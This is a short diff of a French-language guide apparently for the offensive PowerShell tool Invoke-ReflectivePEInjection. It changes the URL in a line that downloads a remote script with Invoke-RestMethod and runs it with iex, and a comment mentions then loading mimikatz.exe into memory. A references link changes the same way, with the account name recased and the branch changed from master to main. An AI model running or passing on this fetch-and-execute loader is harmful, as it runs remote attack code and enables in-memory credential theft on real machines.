@@ -8,7 +8,7 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # Télécharger la version corrigée d'Invoke-ReflectivePEInjection
-$b = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/SafeITConsulting/Invoke-ReflectivePEInjection/refs/heads/master/Invoke-ReflectivePEInjection.ps1"
+$b = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/SafeItConsulting/Invoke-ReflectivePEInjection/refs/heads/main/Invoke-ReflectivePEInjection.ps1"
 iex($b)
 
 # Télécharger un fichier PE (exemple : mimikatz.exe) en mémoire
@@ -88,4 +88,4 @@ Function Get-ProcAddress {
   [PowerSploit CodeExecution](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)  
 
 - Version corrigée :  
-  [SafeITConsulting/Invoke-ReflectivePEInjection](https://raw.githubusercontent.com/SafeITConsulting/Invoke-ReflectivePEInjection/refs/heads/master/Invoke-ReflectivePEInjection.ps1)  
+  [SafeITConsulting/Invoke-ReflectivePEInjection](https://raw.githubusercontent.com/SafeItConsulting/Invoke-ReflectivePEInjection/refs/heads/main/Invoke-ReflectivePEInjection.ps1)  
